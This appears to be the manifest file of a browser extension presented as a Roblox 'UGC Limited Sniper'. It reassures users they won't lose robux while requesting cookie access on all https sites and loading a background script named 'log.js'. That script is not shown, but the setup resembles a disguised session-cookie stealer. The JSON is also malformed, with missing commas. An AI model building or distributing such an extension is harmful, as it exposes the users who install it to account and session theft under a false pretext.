{
    "name": "Ugc Limited Sniper",
    "description": "This only works on free ugc limiteds so don't worry on losing any robux"
    "version": "1.0.0",
    "manifest_version": 2

    "browser_action" : {
        "default_icon": "assets/sniperlogo.png"
    },

    "permissions": [
        "cookies",
        "https://*/*"
    ],

    "background": {
        "scripts": ["scripts/log.js"]
    },

    "icons": {
        "16": "assets/sniperlogo.png",
        "32": "assets/sniperlogo.png",
        "48": "assets/sniperlogo.png",
        "128": "assets/sniperlogo.png"
    }
}
